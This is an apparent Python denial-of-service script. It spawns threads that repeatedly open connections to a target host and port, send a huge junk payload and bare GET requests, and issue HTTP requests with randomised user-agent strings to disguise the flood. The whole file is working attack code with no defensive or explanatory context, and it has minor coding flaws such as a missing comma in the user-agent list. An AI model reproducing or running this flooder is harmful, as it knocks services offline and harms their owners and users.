#!/usr/bin/env python2
import socket,threading,time,sys,random,requests
from queue import Queue
q = Queue()
user_agent=[
	"Mozilla/4.0 (compatible; ms-office; MSOffice 16)"
	"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
	"Mozilla/5.0 (SMART-TV; X11; Linux armv7l) AppleWebKit/537.42 (KHTML, like Gecko) Chromium/25.0.1349.2 Chrome/25.0.1349.2 Safari/537.42",
	"Mozilla/5.0 (Windows NT 5.1; rv:11.0) Gecko Firefox/11.0 (via ggpht.com GoogleImageProxy)",
	"Opera/9.80 (Windows NT 6.1; WOW64) Presto/2.12.388 Version/12.18",
	"Mozilla/5.0 (iPhone; CPU iPhone OS 12_3_2 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148 [FBAN/FBIOS;FBDV/iPhone10,5;FBMD/iPhone;FBSN/iOS;FBSV/12.3.2;FBSS/3;FBCR/AT&T;FBID/phone;FBLC/en_US;FBOP/5]",
	"Mozilla/5.0 (compatible; MSIE 9.0; Windows NT 6.0) Opera 12.14",
	"Mozilla/5.0 (X11; Ubuntu; Linux i686; rv:26.0) Gecko/20100101 Firefox/26.0",
	"Mozilla/5.0 (X11; U; Linux x86_64; en-US; rv:1.9.1.3) Gecko/20090913 Firefox/3.5.3",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows NT 6.2) AppleWebKit/535.7 (KHTML, like Gecko) Comodo_Dragon/16.1.1.0 Chrome/16.0.912.63 Safari/535.7",
	"Mozilla/5.0 (Windows; U; Windows NT 5.2; en-US; rv:1.9.1.3) Gecko/20090824 Firefox/3.5.3 (.NET CLR 3.5.30729)",
	"Mozilla/5.0 (Windows; U; Windows NT 6.1; en-US; rv:1.9.1.1) Gecko/20090718 Firefox/3.5.1"
]
def dos(host,port):
	global data,s,data1
	try:
		while True:
			data = str('GET / HTTP/1.0\n\n').encode('utf-8')
			data1= str('sdopgksdopgksdopgksoggsdggkosdpgksdp156156s1g5s6g1sd5g1sdg561ds56g1sdg5s1gsd56g1sdg561sg5sd1g56sdg165g1goskdgpsogkgopskgopssdgskgsgkspogksgoksdopg')
			data1=data1*10000
			s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
			s.connect((host,int(port)))
			try:
				g=requests.get('http://'+host+':'+str(port),headers={'User-agent':random.choice(user_agent)},timeout=1)			
			except:
				pass
			s.sendto(data1,(host,int(port)))
			if s.sendto( data, (host, int(port)) ):
				s.shutdown(1)
			else:
				s.shutdown(1)
			time.sleep(.1)
	except socket.error as e:
		time.sleep(.1)
	except KeyboardInterrupt:
		sys.exit()
	except:
		print ('[-] Error ..')
def startdos(host,port):
	while True:
		item = q.get()
		dos(host,port)
		q.task_done()
def dos_attack(host,port,thr):
	while True:
			for i in range(int(thr)):
				t = threading.Thread(target=startdos,args=(host,port))
				t.daemon = True 
				t.start()
			item = 0
			while True:
				if (item>1800):
					item=0
					time.sleep(.1)
				item = item + 1
				q.put(item)
			q.join()
